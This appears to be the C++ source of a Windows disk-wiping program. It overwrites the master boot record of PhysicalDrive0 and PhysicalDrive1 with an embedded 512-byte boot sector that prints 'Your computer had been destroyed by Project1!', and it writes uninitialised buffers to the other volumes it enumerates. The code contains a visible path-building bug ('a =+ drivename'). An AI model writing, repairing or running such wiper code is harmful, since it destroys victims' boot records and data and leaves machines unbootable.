#include <windows.h>
#include <iostream>
#include <vector>
using namespace std;
DWORD WINAPI MBRWiper(const char* drivename, unsigned char *MasterBootRecord) {
	/* MBR.bin (6/24/2024 5:17:54 PM)
   StartOffset(h): 00000000, EndOffset(h): 000001FF, Length(h): 00000200 */


	DWORD dwBytesWritten;
	string a = "\\\\.\\";
	a =+ drivename;
	HANDLE hDevice = CreateFileA(
		a.c_str(), GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	return 0;
}
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR    lpCmdLine,
                     int       nCmdShow)
{
		
	unsigned char MasterBootRecord[512] = {
		0xE9, 0x00, 0x00, 0xB4, 0x0E, 0xB0, 0x59, 0xCD, 0x10, 0xF4, 0xB0, 0x6F,
		0xCD, 0x10, 0xF4, 0xB0, 0x75, 0xCD, 0x10, 0xF4, 0xB0, 0x72, 0xCD, 0x10,
		0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xB0, 0x63, 0xCD, 0x10, 0xF4, 0xB0,
		0x6F, 0xCD, 0x10, 0xF4, 0xB0, 0x6D, 0xCD, 0x10, 0xF4, 0xB0, 0x70, 0xCD,
		0x10, 0xF4, 0xB0, 0x75, 0xCD, 0x10, 0xF4, 0xB0, 0x74, 0xCD, 0x10, 0xF4,
		0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x72, 0xCD, 0x10, 0xF4, 0xB0, 0x20,
		0xCD, 0x10, 0xF4, 0xB0, 0x68, 0xCD, 0x10, 0xF4, 0xB0, 0x61, 0xCD, 0x10,
		0xF4, 0xB0, 0x64, 0xCD, 0x10, 0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xB0,
		0x62, 0xCD, 0x10, 0xF4, 0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x65, 0xCD,
		0x10, 0xF4, 0xB0, 0x6E, 0xCD, 0x10, 0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4,
		0xB0, 0x64, 0xCD, 0x10, 0xF4, 0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x73,
		0xCD, 0x10, 0xF4, 0xB0, 0x74, 0xCD, 0x10, 0xF4, 0xB0, 0x72, 0xCD, 0x10,
		0xF4, 0xB0, 0x6F, 0xCD, 0x10, 0xF4, 0xB0, 0x79, 0xCD, 0x10, 0xF4, 0xB0,
		0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x64, 0xCD, 0x10, 0xF4, 0xB0, 0x20, 0xCD,
		0x10, 0xF4, 0xB0, 0x62, 0xCD, 0x10, 0xF4, 0xB0, 0x79, 0xCD, 0x10, 0xF4,
		0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xB0, 0x50, 0xCD, 0x10, 0xF4, 0xB0, 0x72,
		0xCD, 0x10, 0xF4, 0xB0, 0x6F, 0xCD, 0x10, 0xF4, 0xB0, 0x6A, 0xCD, 0x10,
		0xF4, 0xB0, 0x65, 0xCD, 0x10, 0xF4, 0xB0, 0x63, 0xCD, 0x10, 0xF4, 0xB0,
		0x74, 0xCD, 0x10, 0xF4, 0xB0, 0x31, 0xCD, 0x10, 0xF4, 0xB0, 0x21, 0xCD,
		0x10, 0xF4, 0xB0, 0x20, 0xCD, 0x10, 0xF4, 0xE9, 0x00, 0x00, 0xB4, 0x06,
		0xB0, 0x00, 0xFE, 0xC7, 0xB5, 0x00, 0xB1, 0x00, 0xB6, 0x19, 0xB2, 0x50,
		0xCD, 0x10, 0xE9, 0xED, 0xFF, 0x50, 0x52, 0xB9, 0x07, 0x00, 0xBA, 0x40,
		0x42, 0xB8, 0x86, 0x00, 0xCD, 0x15, 0x5A, 0x58, 0xC3, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
	};
    char *str = new char[MAX_PATH];
    HANDLE hVol = FindFirstVolumeA(str, MAX_PATH);
    char *str2 = new char[4];
    DWORD a = 0;
    GetVolumePathNamesForVolumeNameA(str, str2, 4, &a);
    cout << str2 << endl;
    while (FindNextVolumeA(hVol, str, MAX_PATH)){
        GetVolumePathNamesForVolumeNameA(str, str2, 4,&a);
        MBRWiper(str2, (unsigned char*)malloc(512));
    }
    CloseHandle(hVol);
	MBRWiper("PhysicalDrive0",&MasterBootRecord[0]);
	MBRWiper("PhysicalDrive1",&MasterBootRecord[0]);
}